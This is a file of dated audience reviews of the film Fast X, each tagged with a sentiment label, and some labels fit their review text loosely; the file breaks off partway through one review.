"Jun 7, 2023",POSITIVE,"If you are a Fast and Furious Saga fan, you will enjoy the movie !"
"Jun 7, 2023",NEUTRAL,If you're a big fan of nonsense action then hey! Sit Back & Enjoy! the series has gone overboard everyone knows but it's still a fun time!
"Jun 7, 2023",POSITIVE,"A million out of 10, would watch again"
"Jun 7, 2023",POSITIVE,I’ll keep watching if they keep making them
"Jun 7, 2023",POSITIVE,Lots of stories but action packed.
"Jun 7, 2023",POSITIVE,The movie had a great storyline. it was very exciting!!
"Jun 7, 2023",POSITIVE,A lot of action. I love fast x
"Jun 7, 2023",POSITIVE,Some of the Stunts seems too unrealistic to survive
"Jun 7, 2023",NEGATIVE,"I purchased tickets with a PROMO code from Fandango for Saturday and after I paid for it, it came up as Today. They won't change the date for me. Upset with customer service"
"Jun 7, 2023",POSITIVE,Thought it was great.  Love all the action.  That never gets old.
"Jun 7, 2023",NEGATIVE,"DO NOT WASTE MONEY ON THIS. Poorly written, horrible acting, stupid stunts. You would get more entertainment watching people at Walmart. Pathetic, I hope the next ones get cancelled."
"Jun 7, 2023",POSITIVE,Excelente filme. Ação do início ao fim.
"Jun 7, 2023",POSITIVE,Jason Momoa was awesomely crazy!
"Jun 7, 2023",POSITIVE,Action packed with thrilling excitement. All about family and the importance of staying true to the ones you love and care about.
"Jun 7, 2023",POSITIVE,"In my opinion this is the best Fast movie probably since the unfortunate passing of Paul Walker. While there are some moments that are like ""c'mon"" most of the movie is pretty good. Vin Diesel does usual superhero like things. John Cena probably has his best performance yet and there are some twists that catch you off guard. There is both good and bad regarding Jason Momoa as the villian but I am excited what he delivers in the next two films. And make sure you stay for the end credit scene because it is a good one. Overall like most Fast films it is filled with action and was overall a fun movie"
"Jun 7, 2023",NEGATIVE,"The movie was super hyped up and the story just really didn't match. Yes lots of action but it really fell flat and I know that they laid it out for another movie but now I am thinking I am done with these movies. Jason Momoa made a very convincing Gay guy, but he was way to predictable and just so sad."
"Jun 6, 2023",NEGATIVE,This movie was not good. The fast and furious movies have really gone downhill.
"Jun 6, 2023",POSITIVE,The action was pretty good
"Jun 6, 2023",POSITIVE,Over the top. that's the reason I liked it so much we go to the movies to be entertained.
"Jun 6, 2023",NEGATIVE,"THE MOST RIDICULOUS ONE YET! SAVE YOUR MONEY AND WAIT TILL IT'S STREAMING AND EVEN THEN, IF YOU HAVE ANYTHING BETTER TO DO, DO IT! STUPID!!"
"Jun 6, 2023",POSITIVE,I love the ridiculousness of these movies
"Jun 6, 2023",NEGATIVE,Just to fake for me. But it was packed with lots of action.
"Jun 6, 2023",POSITIVE,"excellent movie buy, the ending was weird"
"Jun 6, 2023",POSITIVE,I really did enjoy this movie and it’s the first time I seen a movie in 2023 for this year so far and I thought it was really good but didn’t care for the ending though thar much and love Brie Larson too in this movie she is so sexy as hell and gorgeous too and I give Fast X a 9.5/10 stars for me 
"Jun 6, 2023",POSITIVE,Great action movie I don't think I blinked for the whole 2 1/2 hours. The ending has left us waiting for the next edition to see who  survived the last  deadly threat. Don't want to spoil it for you!
"Jun 6, 2023",POSITIVE,We liked the show. It was an action packed movie
"Jun 6, 2023",POSITIVE,omg just what I Loved Action packed can't wait for second part
"Jun 6, 2023",NEUTRAL,"A franquia dos velozes e furiosos começou muito bem apresentado seu propósito e com o tempo eles foram errando, acertando, corrigindo seus erros e a cada filme as cenas impossíveis foram cada vez se superando mais e mais nesse filme eu achei que os atores foram bem no que eles proporão desde o início da franquia até aqui e nesse filme o lema da família ainda é um pouco criticado por parte de algumas pessoas porém pelo que o filme apresenta eu acho que cabe bem no contexto da história e tudo que a franquia apresentou esse filme deu um ar de despedida e de conclusão porém a franquia foi se perdendo de um tempo pra cá mas eu acredito que pelo que ele propõem ele é um filme nem ruim mas também não chega a ser ótimo é um filme mediano ali bom que vai entreter bem seu público"
"Jun 6, 2023",POSITIVE,"Ótimo filme, bastante ação uma loucura"
"Jun 6, 2023",POSITIVE,As dumb and fun as I hoped! The Family won't be disappointed.
"Jun 6, 2023",POSITIVE,Great movie I agree with vin diesel's opinion of Jason mamoa he is horrible and did so much over compensating for his total lack of acting ability
"Jun 6, 2023",POSITIVE,Very good action movie!
"Jun 6, 2023",NEUTRAL,Jason Momoas character is great
"Jun 6, 2023",NEGATIVE,The movie lacked real story line. Entire movie was CGI car chasing scenes with multiple explosion scenes that were overdone. The forced comedic lines were overly cheesy.
"Jun 6, 2023",POSITIVE,"Lots of action, loved it and so did the kiddos."
"Jun 6, 2023",POSITIVE,It was awesome as usual.
"Jun 6, 2023",POSITIVE,THAT MOVIE IS AWSOME.
"Jun 6, 2023",NEGATIVE,"The character is fine. But this part is the worst of the parts, the movie content, the details have no logic. The dialogue in the movie makes no sense. Too many characters thrown into the movie, like a messP"
"Jun 6, 2023",POSITIVE,This was an excellent movie the action was awesome and the ending is very interesting. Must see.
"Jun 6, 2023",NEUTRAL,Performing of Jason Momoa was the Best of the movie
"Jun 6, 2023",NEUTRAL,"Better than Fast 8-9 but about 30 minutes too long. Momoa saves what otherwise would've been mediocre, but a lot of the settings and set pieces felt too much like rehashes of past Fast films.

The characters get split up early and spend most of the runtime apart, either alone or in 2-3 character sub groups. This works better in some cases than others, and John Cena was fun but also a complete 180 from his character in Fast 9. 

Overall, like the last few, it's still just a bunch of big set pieces connected by a weak plot, so either you like these movies and will probably enjoy it, or you don't and will see it as a waste of time."
"Jun 6, 2023",POSITIVE,"This is what summer movies are supposed to be. What a fantastic moment spent in a theater surrounded by a crowd cheering at ever turn. The actors are perfect,. Fast and Furious is beck to its greatness. I will go back to see it with my friends after seeing it with my family who loved ir as much as I did.. 10/10."
"Jun 6, 2023",NEUTRAL,Loved it but wish they had not made Jason Mamoa seem gay.
"Jun 6, 2023",NEGATIVE,"for the love of all that is good and holy, this movie was bad. here's the thing, I dont expect much from the fast franchise. the story has been bad since 6, but this movie wasn't even enjoyable. they completely ignored any continuity from this same movie for a quick forced joke or gasp moment. and they're still trying to make the series make sense, and I don't even get how they think it's possible. I look for the good in movies. Even if it's not some deep story, it can still be enjoyable. but this movie wasn't even that, even thinking of it like a fast and the furious movie. there were so many times I legit thought they used the movements of the transformers ride in universal studios in the movie with just a cgi car. like u know this series doesn't like to think of physics, but this was an extreme version even compared to the rest of the movies. and the action wasn't even that good. my girl's brother fell asleep like halfway through. 
this is gonna be my only SPOILER!!!
obviously, I wasn't a fan, but I didn't straight up hate this movie until it ended on a cliffhanger. two more specifically, but they really want a sequel??? why??? this movie was LONG, and they still want a second part. this has got to stop. especially since Vin diesel says its for the late Paul walker. pretty sure he guilt tripped the rock into coming back for these movies using his name."
"Jun 6, 2023",POSITIVE,Super funny over the top fast car movie.
"Jun 6, 2023",NEGATIVE,This was such an awful movie. I wanted to walk out within the 1st 30 min. It just kept getting worse and worse. There were so many unbelievable things done with cars that it felt like a team of 6 year old boys playing with Hot Wheels were the creative minds behind this movie.
"Jun 6, 2023",POSITIVE,"Awesome movie one of the best,  fast and furious as always."
"Jun 6, 2023",NEGATIVE,"I love the concept and story
Line, but the movie is too dark for
Kids to see whats going on, the picture
Was not that good lots of dark scenes the fighting scene in the end where Ursula
Became so big, I cant see the face/facial expressions and the acting on both Prince Eric and Little mermaid is just so so, even the young version of Ursula. I gotta say Mcartney  did a good acting wise. The character was not as detailed as the original movie. Plain and bare. Overall 2 stars only. Not so good for me"
"Jun 6, 2023",POSITIVE,"Excelentes escenas de acción, si nos olvidamos del realismo, e incluimos la ciencia ficción, podemos disfrutar mucho la película."
"Jun 6, 2023",POSITIVE,Solid movie overall. The new villain really brings it together in a great way.
"Jun 6, 2023",POSITIVE,"Good movie, but really had you questioning what really happen too everyone. Leaving it open for a Fast 11 movie lol"
"Jun 6, 2023",POSITIVE,"Amazing movie , not happy with the sudden ending 😓"
"Jun 6, 2023",NEGATIVE,"It’s a Fast film… I don’t watch them for spectacular cinema! It’s all about Family, Stunts, Cars and Craziness! I got every bit of that and can’t wait for more."
"Jun 6, 2023",POSITIVE,A Film packed with a ton of actions that must be seen on the big screens
"Jun 6, 2023",POSITIVE,"If you’ve enjoyed the series this far, then you’ll still enjoy the the ride."
"Jun 6, 2023",POSITIVE,It was good but a bit unbelievable.
"Jun 6, 2023",NEUTRAL,I think they are  running out of material:)
"Jun 5, 2023",NEUTRAL,The end it leaves you handing end too many dead people are showing up along with atomic subs that have been destroyed and jumping out of planes in a car what happened to cap. Marvel she just stopped coming around?
"Jun 5, 2023",POSITIVE,Hate to admit it but this is a nice refreshing movie for being part of the fast franchise... its nice to see some actual car scenes again. Well done!
"Jun 5, 2023",NEUTRAL,Kinda Knew What was going to happen based off the trailer
"Jun 5, 2023",POSITIVE,"The truth is the effects, the songs, the actors and, among other things, the truth made me a good movie. The truth is, I was left wondering if the fast furious X part 2 will come out... Maybe fast and furious 11... Well, it stays up in the air if this saga continues..."
"Jun 5, 2023",POSITIVE,"Movie did not disappoint! Full of action and Jason Mamoa was exquisite, funny and loved his witty villain character. A definite myst see again on the big screen."
"Jun 5, 2023",POSITIVE,I loved the storyline and the action.  The driving was terrific.
"Jun 5, 2023",POSITIVE,Loved the unexpected
"Jun 5, 2023",NEGATIVE,"The Saga should have ended on Furious 7, although Fate 8 was the pretty good, it should have ended on Furious 7."
"Jun 5, 2023",NEGATIVE,"Please, just stop! Please!"
"Jun 5, 2023",POSITIVE,"This is a must see, if you love the fast and furious franchise."
"Jun 5, 2023",POSITIVE,"I like the movie if you like fast cars, watch it"
"Jun 5, 2023",NEUTRAL,Expectations we're low.  Amazingly found it very entertaining with lots of action and comedy with the new villain.
"Jun 5, 2023",NEGATIVE,Same same old bunch of car fighting bullshit.
"Jun 5, 2023",POSITIVE,Loved the eye candy!
"Jun 5, 2023",POSITIVE,Plenty of action. The villain was great.
"Jun 5, 2023",NEUTRAL,"Fast X, the latest installment in the Fast and Furious franchise, delivers the high-octane action and adrenaline-pumping stunts that fans have come to expect. The film showcases jaw-dropping car chases, explosive set pieces, and a star-studded cast, creating an entertaining experience. However, while it succeeds in delivering thrills, there are areas where Fast X could have improved to elevate the overall film.

The action sequences in Fast X are undeniably impressive. The car chases are visually stunning, and the stunts are mind-boggling, showcasing the ingenuity and technical prowess of the filmmaking team. The film's relentless pace keeps the energy high, making it an engaging watch for fans of the franchise's action-packed formula.

The ensemble cast, led by the charismatic Vin Diesel, delivers solid performances and keeps the chemistry between the characters alive. The return of familiar faces and the introduction of new additions add variety to the cast dynamic, providing some enjoyable moments and interactions. The film's commitment to diversity and inclusion is also commendable, as it showcases a range of talented actors from different backgrounds.

However, Fast X falls short in terms of narrative depth and character development. The storyline feels formulaic and predictable, lacking the emotional stakes and depth that would have elevated the film beyond just a series of thrilling action sequences. While the franchise has always been known for its over-the-top spectacle, a stronger emphasis on story and character arcs would have added a layer of substance and resonance to the film.

Another area where the film could have improved is in its editing and pacing. Certain scenes feel rushed, hindering the audience's ability to fully appreciate the intricacies of the action and follow the plot developments. A more balanced approach to the editing process would have allowed for better cohesion between the fast-paced action and the storytelling.

Additionally, the film's reliance on CGI at times detracts from the authenticity and practicality that made the earlier entries in the franchise so thrilling. While the visual effects are generally well-executed, a greater emphasis on practical stunt work and realistic physics would have enhanced the overall immersion and visceral impact of the action sequences.

In summary, Fast X delivers on its promise of high-octane action and a star-studded cast. The film's breathtaking stunts and impressive visuals provide an entertaining experience for fans of the franchise. However, it falls short in terms of narrative depth, character development, and editing, preventing it from reaching its full potential. Despite its flaws, Fast X still manages to deliver an enjoyable thrill ride for those seeking an adrenaline-fueled escape."
"Jun 5, 2023",POSITIVE,"Great movie, just sucks I have to wait for them to come out with conclusion. I expected to see a complete movie."
"Jun 5, 2023",NEUTRAL,I honestly would put this in my top 5 of the franchise! Apart from some wild but what I've come to expect scenes i really enjoyed this movie!
"Jun 5, 2023",POSITIVE,A fairly unremarkable action film with a villain who truly stands out. Momoa is the movies saving grace and truly phenomenal
"Jun 5, 2023",POSITIVE,I enjoyed the action and suspense.
"Jun 5, 2023",NEUTRAL,"Didn't have high hopes walking in, I expected it to be over the top and but also very action packed and in my opinion it absolutely was.  This franchise is getting out of hand with its incredible unrealistic scenes that just make you question the whole movie.  Jason Mamoa over acted, it was weird seeing him act and play a character like this and not in a good way, I had times during the movie when I was waiting for it to end, it was kinda entertaining and very action packed but other than that it wasn't great."
"Jun 5, 2023",POSITIVE,It was good its just crazy how they brought the girl back alive again
"Jun 5, 2023",POSITIVE,"I was worried it would be boring being ten movies into the franchise, but it certainly wasn't. I was quite surprised at how good it was."
"Jun 5, 2023",NEGATIVE,"Jason Mamoas character was terribly annoying, honestly couldnt recommend this specifically because of him"
"Jun 5, 2023",POSITIVE,definitely an excellent movie much better than the last movie and definitely looking forward to the end to see who all made it
"Jun 5, 2023",POSITIVE,It was an amazing movie! Definitely a must see film. I thought it would be like the rest of the series but it changed for the better.
"Jun 5, 2023",POSITIVE,Another Awesome Edition of the Fast and Furious World! With the addition of another Super Villain ( Jason Momoa). Were left clinging to our seats. Waiting for F&F 11 with the addition of Dwayne Johnson! I cant wait!!!! Heres to the next!!!
"Jun 5, 2023",NEUTRAL,It was okay not as good as I thought it would be or has been in the past other than that 3
"Jun 5, 2023",NEGATIVE,"Even though i've been watching F&F since the first movie, this one is not great, the ending is a cliffhanger, and the plot is awful"
"Jun 5, 2023",POSITIVE,"If you want real unbelievable stay home and do your taxes. If you're looking for entertainment that's fun, exciting and heart pumping action... well can't wait to see the next adventure"
"Jun 5, 2023",POSITIVE,"The action and effects were good, although some parts looked a bit too fake. For a 2.5 hour long movie, I was expecting a good ending. But this movie sort of left you hanging. But I dont regret watching it. Now Im waiting on the next one to come out."

"Jun 5, 2023",NEGATIVE,I'm a huge Fast fan…but this series just keeps getting worse and worse. It's sad because I think these movies could have easily stayed fun and enjoyable…but they've just become so dumb.
"Jun 5, 2023",NEGATIVE,"The movie, as usual, has many ""liar"" action scenes, ok... But the drama is akward. And the context in the countries where the history rolls... Zero previous research. Specially in Brazil. Dear god, ""Hernan Reyes""... We speak Portuguese! Fernando Reis, ok, it woul be a normal name. ""Dante""?... it's uncommon. The songs? The wear... The cars... Sprint race? The car is Gol, with AP motor, and an insane pressure of turbo... Or an Opala... Summary, very bad."
"Jun 5, 2023",POSITIVE,This movie has literally raised the bar since the last VIllian. Jason Mamoa was simple Excellent in his performance. The comedy sequences mixed with Action packed scenes tied in perfectly and really set the tone for Part 2 and 3. Looking forward for the next one.
"Jun 5, 2023",POSITIVE,It's  a franchise that keeps giving what it's meant to give. The plot twists and actions in this movie were superb. the new villain is a great boost to this movie franchise. The movie was all around great from the beginning to the Post credit scene.
"Jun 5, 2023",NEGATIVE,"What is wrong with the Spherical bomb?, rolling all over the city and unstoppable, this movies now are lame..."
"Jun 5, 2023",POSITIVE,Best fast and furious movie yet
"Jun 5, 2023",POSITIVE,Movie was another action packed film with great actors and leaves you in disbelief throughout the movie with some surprises @ the end
"Jun 5, 2023",NEUTRAL,"I've loved almost all of the fast franchise so far. Especially the last one but this one had all the action I was expecting, yet it felt like for no reason there was a very weak story which made it all feel like for nothing. But action still is action."
"Jun 5, 2023",POSITIVE,loved the action non stop. never disappoints
"Jun 5, 2023",POSITIVE,Action from start to finish! It was better than some of the other ones Ive seen. It didnt disappoint!
"Jun 5, 2023",POSITIVE,Jason Momoa is another awesome villain.
"Jun 5, 2023",NEUTRAL,"It was a decent movie, but jumped the shark years ago. Only saw this one because it was free. Wouldn't pay to see it, and kinda burned out on this franchise."
"Jun 5, 2023",POSITIVE,Fast paced.. adrenaline pumping action packed movie
"Jun 5, 2023",NEGATIVE,"It's surprisingly refreshing every time that Jason Momoa is on screen, he is a great villain for an otherwise dreadfully boring movie. If fast and furious nine hadn't convinced you that this franchise was in the dump then Fast X sure gives you a whole new reason why! This movie is so astoundingly bad for this franchise it's funny. If Vin Diesel hasn't learned how to act after 10 movies then I'm just going to assume he will never figure it out."
"Jun 5, 2023",POSITIVE,I love it soooo much
"Jun 5, 2023",POSITIVE,"I don't care what would the critics say, I haven't had this much joy in cinema for a long time !"
"Jun 5, 2023",POSITIVE,liked the movie a lot! Action was fast and furious. LOL I was not a fan of how it ended but would have planned to see another in any case.
"Jun 5, 2023",NEGATIVE,"I tried to watch the movie, but it's just a waste of time."
"Jun 5, 2023",POSITIVE,"Definitely kept your attention the whole time, on the edge of your seat! I liked how there's a large pool of past characters to draw from. Be prepared to be thrown for a loop at the end, as this series tends to do. I recommend seeing it for sure if you follow the series."
"Jun 5, 2023",NEGATIVE,This is a kid’s movie
"Jun 5, 2023",NEGATIVE,Genuinely so awful. The script was so bad. The action was not even good. The only good part of the movie was the driving scenes and fight scenes. Nothing made any sense. The direction they went with this movie was terrible.
"Jun 5, 2023",POSITIVE,Good action waiting for the next movie to come out
"Jun 5, 2023",POSITIVE,Always love fast and the furious movies
"Jun 5, 2023",NEUTRAL,Did not like the way it ended.
"Jun 5, 2023",POSITIVE,Didn't like that it is in 2 parts...
"Jun 5, 2023",POSITIVE,2 words purple Cadillac
"Jun 5, 2023",NEGATIVE,Ended stupid and kept talking about Family… movie was cringy.
"Jun 4, 2023",POSITIVE,Jason Momoa is hysterically funny. Absolutely love the tribute to Paul Walker.
"Jun 4, 2023",POSITIVE,Lots of action and car crashes.
"Jun 4, 2023",NEUTRAL,ok but getting stale and even DJ's return might not move it forward again
"Jun 4, 2023",POSITIVE,"ChatGPT

Fast X is a thrilling two-hour, 21-minute ride that takes you across multiple cities, from Los Angeles to Rome, Rio, Portugal, and London. Director Louis Leterrier makes the most of his budget, delivering exhilarating action scenes like a bomb bouncing through the streets of Rome and a massive vault being dragged through Rio. While it doesn't reach the same level of outlandishness as Fast 9's space stunt, the film still packs a punch. The story kicks off with a gripping flashback, pulling Dominic Toretto out of his peaceful life and into a collision with the vengeful Dante Reyes, son of a drug lord. Jason Momoa injects the film with a burst of energy, bringing a unique and intense performance. After over 20 years, the cast may not be as fast or furious, but Momoa's presence revitalizes the sequel."
"Jun 4, 2023",POSITIVE,I did not like the ending.
"Jun 4, 2023",POSITIVE,I enjoyed everything about the movie!
"Jun 4, 2023",POSITIVE,Loved this movie! Lovers of this franchise should stick until the end credits. You're in for a surprise!!
"Jun 4, 2023",NEGATIVE,The worst fast x movie yet. Don’t waste your money by watching in theater.
"Jun 4, 2023",POSITIVE,Cliff hangerj ready now for next movie
"Jun 4, 2023",POSITIVE,I wish the second part would come out soon. I cannot wait to see what happens.
"Jun 4, 2023",POSITIVE,"Absolutely the best Fast and Furious movie in the franchise thanks to the ""Joker-like"" performance of Jason Momoa and building off of what is now the second-best movie in the franchise, Fast Five."
"Jun 4, 2023",POSITIVE,"action packed, loud. Enjoyed"
"Jun 4, 2023",POSITIVE,This movie was action-packed. All the way to the end.
"Jun 4, 2023",POSITIVE,The movie was dope and hilarious in a F&F way!!
"Jun 4, 2023",NEGATIVE,"The stings were so ridiculous, I couldn't even enjoy the movie.  Paul Walker is cringing in the afterlife"
"Jun 4, 2023",POSITIVE,I read a bunch of reviews that said it wasnt as good as the previous movies and honestly I felt like the reviews were a lie. This movie was great! I love all the cameos and cannot wait for the next movie!
"Jun 4, 2023",NEUTRAL,Definitely action but a lot of impossible stunts
"Jun 4, 2023",NEGATIVE,"Eeerrrm oh dear after number 9 the franchise needed to redeem itself but sadly I gave up after an hour and thought I'd cut my eyelids off and face the sun instead

Only redeeming feature is JM as Dante 

Wait for streaming"
"Jun 4, 2023",POSITIVE,"action, morals, values-- awesome"
"Jun 4, 2023",POSITIVE,It was action packed! Full of surprises! And everything you expecting and love about Fast and Furious!
"Jun 4, 2023",POSITIVE,"Most fast fans will disagree but Jason mamoa was outstanding, the character portrayal was great as well he is by far the greatest villain the fast franchise has ever had ignore the stunts why should it only be about street racing when we're all seeing the the evolution in each movie let's forget those that didn't deliver and continue enjoying the coming movies for I look forward to even seeing Tyrese Gibson's performance once more."
"Jun 4, 2023",NEUTRAL,"Mid asf, I spent the entire time watching it just thinking ""why continue this franchise"" but then i remembered these studios care more about cash than making good movies, it had some cool action I guess but thats the whole of it, they should have stopped at fast 7, paul walkers legacy shouldn't be this shit, this franchise once stood for something and it was great but now all they care about is having boomers come and fill up the studios pockets."
"Jun 4, 2023",NEUTRAL,Unreal  not as good as past movies.
"Jun 4, 2023",NEGATIVE,"I fell asleep. Also the overarching woke agenda was rather annoying, creating an unrealistic plot."
"Jun 4, 2023",NEGATIVE,alright movie could have easily fit it all in 1 movie tho didnt even need a 10 nevermind an 11
"Jun 4, 2023",NEGATIVE,"Momoa's character is terrible, worst villain ever seen, decent action scenes, exaggerated as usual, a lot of random BS in every plan but you know is Fast and Furious..."
"Jun 4, 2023",NEGATIVE,"No acting, no story - just a stupid movie that was a complete waste of time"
"Jun 4, 2023",NEUTRAL,"After the disappointments that were 8 & 9, I went into Fast X with zero expectations, which is why I actually had a fun ride. Hits every ""family"" story you expect but does it in a Furios 7/Fast 6 way - which left me entertained.
Lastly, a cliffhanger ending which doesn't take away from the entertainment factor."
"Jun 4, 2023",POSITIVE,Really enjoyed it!! Cant wait for the next movie!!
"Jun 4, 2023",POSITIVE,"This film is over the top utterly bonkers and lots of fun, if your a fan of the past FF films you will love this."
"Jun 4, 2023",POSITIVE,Love all of them can't wait till furious 11!
"Jun 4, 2023",NEUTRAL,"Much better then F9, but it may be too late, the franchise is ending and if we still get these ""okay"" movies I feel the franchise will be wasted."
"Jun 4, 2023",POSITIVE,I disliked the ending. Not knowing who was alive or dead and how you brought back a dead girl again! And an Abuela that makes her first appearance in 10!
"Jun 4, 2023",POSITIVE,"you just gotta see for yourself! it's good  a whole roller coaster ride.  your nerves will need a stiff drink afterwards,  but it'll be worth it."
"Jun 4, 2023",NEGATIVE,"Jason Momoa is a great Villain. Other than that, skip this movie and hope he's in a better one with the same role..."
"Jun 4, 2023",POSITIVE,loved it so much! Never dissapoints♡
"Jun 4, 2023",POSITIVE,"Goofy, over the top, silly one liners my 4th grader could’ve written. With that said, it was so fun to watch in the theaters. Even though I frequently laughed at scenes and lines that weren’t designed to be funny I really enjoyed it. "
"Jun 4, 2023",POSITIVE,Always great stunt scenes but left us hanging...how long will we have to wait for answers?
"Jun 4, 2023",POSITIVE,Lots of action and comedy.  Everyone played their roles to perfection. A must see!
"Jun 4, 2023",POSITIVE,"A modern classic, Fast X delivers more of what people pretend they don't want and then watch sooner or later anyway."
"Jun 4, 2023",NEUTRAL,I love f&f movies this one is too much. the entire thing requires you to ignore obvious logistical issues and impossibilities.
"Jun 4, 2023",POSITIVE,"Love the franchise, always will! But this movie has me wanting to go back and see it a second time!"
"Jun 4, 2023",NEGATIVE,Probably the worst F & F movie yet. Jason Mamoa’s character is terrible. He’s attempting to be like the Joker & it falls flat.
"Jun 4, 2023",NEGATIVE,"The film lacks a solid storyline, leaving viewers confused and disconnected. The excessive focus on mindless action sacrifices character development and dialogues, resulting in a forgettable viewing experience. The performances feel uninspired, lacking the chemistry and authenticity that made previous films enjoyable. The film relies too heavily on CGI, sacrificing realism. Fast X offers nothing new or original. Overall, it's disappointing and fails to capture the excitement and depth of the first few Fast and Furious movies."
"Jun 4, 2023",NEUTRAL,Didnt like it will be in 2 parts. Thought the campy playful villain was completely not necessary.
"Jun 4, 2023",NEUTRAL,The ending was horrible and not much racing
"Jun 4, 2023",NEGATIVE,"Title of the review: ""Fast & Furious 10: A Worn-Out Formula that Fails to Deliver Freshness""

Since its original release over two decades ago, the ""Fast & Furious"" saga has been known for its high-octane action, epic chase scenes, and charismatic cast. However, with its tenth installment, titled ""Fast & Furious 10,"" it becomes clear that the formula has lost much of its original shine. This film is a perfect example of how a franchise can wear thin and lose its sense of novelty and excitement.

Directed by Louis Leterrier, known for his work in other action films, ""Fast & Furious 10"" promised to be a triumphant return to the roots of the franchise and an opportunity to revitalize it. However, what we find on screen is a collage of clichés and predictable situations that barely manage to hold the viewer's interest.

The cast, composed of famous names like Vin Diesel, Jason Momoa, Jason Statham, and Michelle Rodriguez, cannot rescue the film from its messy and predictable script. While each of them does their best with the characters they are given, their performances are not enough to compensate for the lack of character development and uninspired dialogue.

The biggest problem with ""Fast & Furious 10"" lies in its desperate attempt to surpass the action sequences of previous installments. Instead of offering something new and exciting, the driving sequences and vehicle confrontations feel repetitive and exaggerated to the point of disbelief. It seems that the franchise has lost the balance between action and coherence, sacrificing logic in the name of spectacle.

Furthermore, the excessive runtime of the film, at 141 minutes, only contributes to making the experience more exhausting. As the plot drags on, viewers are forced to endure unnecessary subplots and underdeveloped secondary characters that don't add anything meaningful to the main story.

In summary, ""Fast & Furious 10"" is a clear example of a saga that has lost its shine. With a predictable plot, shallow characters, and over-the-top action sequences, the film becomes a tired and worn-out exercise of what used to be an exciting franchise. While die-hard fans of the series may find some moments of entertainment, those seeking a fresh and stimulating cinematic experience will be disappointed. It is time for the ""Fast & Furious"" franchise to rethink its approach and find a new direction if it wants to remain relevant in the landscape of action cinema."
"Jun 4, 2023",POSITIVE,"Undoubtedly the best film in the saga after the 5th and 7th. Much funnier than the 9th chapter, and also more realistic, there are the usual over-the-top action scenes (I would have been disappointed if there weren't) but at least it doesn't take Roman and Tej into space. The Infinity War-like structure works so much because you don't notice the (relatively) long duration thanks to characters being split into multiple groups, fast-paced action scenes, the new ultimate villain and a pending ending for part 2. Vin Diesel seems to be the only one taking himself seriously, and this also works. Jason Momoa is basically a Joker version, John Cena is Peacemaker, and new and returning characters played by Brie Larson, Daniela Melchior and Jason Statham are all great and I would have liked to see more of them."
"Jun 4, 2023",NEUTRAL,"Too much of a setup for the next one? Nice flashbacks though. Pairing Letty & Cipher confusing, guess TBD. Didn't Mia and Bryan have 2 kids (frolicking on the beach in a previous film that was Paul Walker's last appearance) What happened to them? Or are they in an undisclosed location with Bryan?"
"Jun 4, 2023",NEGATIVE,Worst Fast and the Furious I’ve seen. Never have I fallen asleep at the theater until today
"Jun 4, 2023",NEGATIVE,ooh my god mhat a stupid movie in the last 30 or 40 minutes i expect super man or spider man to show up...
"Jun 4, 2023",POSITIVE,"I loved the movie because it was so authentically fast and furious lol. Yes, in some shape or form the movies are always basically the same but that's what makes it so great and you can't even be mad at it. The saga never fails to disappoint and will give you everything you'd expect for a fast film. The fact that they cameoed every single character possible into the movie was just pure gold and  hilarious. Definitely enjoyed this and look forward to part two."
"Jun 4, 2023",POSITIVE,Awesome movie with full of action!!!
"Jun 4, 2023",POSITIVE,left a lot of questions leading into various directions. overall a good movie.
"Jun 4, 2023",POSITIVE,Impressed with Dominic Toretto’s seemingly lack of neck and back pain at this point in the franchise
"Jun 4, 2023",POSITIVE,It was so action packed and the villian was hilarious!!!
"Jun 4, 2023",POSITIVE,i liked the characters and the story line and the incredible car chase scenes.the only thing i didnt like was that Alan Ritchson was a villain .
"Jun 4, 2023",POSITIVE,Cant wait for the next FastLifeLoveTheThrills
"Jun 4, 2023",POSITIVE,I like to keep the same crew like a family
"Jun 4, 2023",POSITIVE,Such a good one it was funny and good action!
"Jun 4, 2023",POSITIVE,"I loved the movie, I wanted more. But I guess I got to wait for the next installment."
"Jun 4, 2023",NEUTRAL,Had a lot of fun with this one! Wish it was a long big movie and didn’t have to wait for 2 other parts but I can’t wait for them!
"Jun 4, 2023",POSITIVE,cool film but left on cliff hanger so 1 star
"Jun 4, 2023",NEGATIVE,More of the same.  Terrible dialog and unrealistic stunts. Two hours of wasted time and money.
"Jun 4, 2023",POSITIVE,Corny but really good. Bestt one yet.
"Jun 4, 2023",POSITIVE,great movie. don't like the ending
"Jun 4, 2023",POSITIVE,absolutely loved the movie! hate having it end without a normal ending though! can't wait for the next one!
"Jun 4, 2023",POSITIVE,Love everything about and left me with so many questions in answered. Can't wait for the next one.
"Jun 4, 2023",NEGATIVE,"It was literally terrible, wanted to get up and leave half way through the movie, if your a loyal fast and furious fans just save your time and money, terrible"
"Jun 4, 2023",POSITIVE,"Great movie, however just like all previous Fast and Furious movies it features a lot fast cars and plenty of hot female characters."
"Jun 4, 2023",POSITIVE,I would recommend taking your kids and family to watch it it’s AMAZING
"Jun 4, 2023",NEUTRAL,"Jason Momoa’s role was fun, otherwise it was pretty meh and rather corny."
"Jun 4, 2023",POSITIVE,"Action packed, great plot"
"Jun 4, 2023",POSITIVE,It was better than Fast 9
"Jun 4, 2023",POSITIVE,"Fun for whole family, thrilling, and very action-packed"
"Jun 4, 2023",NEUTRAL,"Fast X is the tenth and second-last installment in the Fast & Furious franchise, which has thrilled fans with its action-packed and heartfelt stories for over two decades. The film is directed by Louis Leterrier, who replaced Justin Lin due to creative conflicts. It follows Dom Toretto (Vin Diesel) and his crew as they face their most formidable foe yet: Dante Reyes (Jason Momoa), the son of a drug lord they killed in Fast Five.

The film is a love letter to the loyal fans of the franchise, as it revisits and honors many of the previous films and characters. It also features an amazing cast of old and new stars, including Michelle Rodriguez, Tyrese Gibson, Ludacris, John Cena, Nathalie Emmanuel, Jordana Brewster, Sung Kang, Helen Mirren, Brie Larson, Rita Moreno, Jason Statham, Charlize Theron, and more.

Fast X delivers what it promises: stunning stunts, exotic locations, fast cars, and witty banter. The film takes the action to a new height, with scenes that defy the laws of physics and logic. The film also pays homage to its roots by referencing or recreating some of the most iconic moments from the series.

However, the film also has some drawbacks that weaken its impact as the series' climax. The plot is complicated and implausible, relying on too many coincidental and illogical twists. The dialogue is corny and repetitive, with Dom constantly lecturing about family and loyalty. The action scenes are exaggerated and unrealistic. The film's duration is too long, dragging for more than two hours without much variation or surprise.

The film also shines thanks to Jason Momoa's performance as Dante Reyes, who is a charismatic and ruthless villain. He brings a sense of danger and intensity to the role, making him a worthy adversary for Dom. He also has some emotional depth and motivation for his actions, as he blames Dom for destroying his family's legacy.

